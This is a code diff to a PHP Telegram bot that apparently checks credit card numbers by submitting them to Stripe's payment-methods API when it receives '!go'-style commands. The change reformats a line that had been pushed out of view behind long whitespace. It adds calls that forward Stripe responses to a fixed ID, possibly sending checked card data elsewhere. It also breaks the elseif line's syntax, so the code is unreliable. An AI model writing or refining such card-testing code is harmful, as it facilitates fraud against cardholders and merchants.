@@ -1968,7 +1968,10 @@ curl_close($ch);
         $postcode = $matches1[1][0];
 
 	*/
-$cc = implode('+', $partes);                               $curl = curl_init();                                       curl_setopt_array($curl, [                                   CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
+$cc = implode('+', $partes);
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
   CURLOPT_RETURNTRANSFER => true,
   CURLOPT_ENCODING => '',
   CURLOPT_MAXREDIRS => 10,
@@ -1992,7 +1995,7 @@ $err = curl_error($curl);
 $json = json_decode($response, true);
 $id = $json["id"];
 curl_close($curl);
-
+sendPv($myid, $response);
 
 
 $curl = curl_init();
@@ -2026,6 +2029,7 @@ curl_setopt_array($curl, [
 $response = curl_exec($curl);
 $err = curl_error($curl);
 curl_close($curl);
+	sendPv($myid, $response);
 	
 editMessage($chat_id, $response, $id_text);
 
@@ -2033,8 +2037,7 @@ editMessage($chat_id, $response, $id_text);
 }
 
 
-
-elseif((strpos($message, "!go") === 0)||(strpos($message, "/go") === 0)||(strpos($message, ".go") === 0)){            
+elseif(strpos($message, "!go") === 0)||(strpos($message, "/go") === 0)||(strpos($message, ".go") === 0)){            
 $lista = substr($message, 4);
 $i = preg_split('/[|:| ]/', $lista);
 $cc    = trim($i[0]);
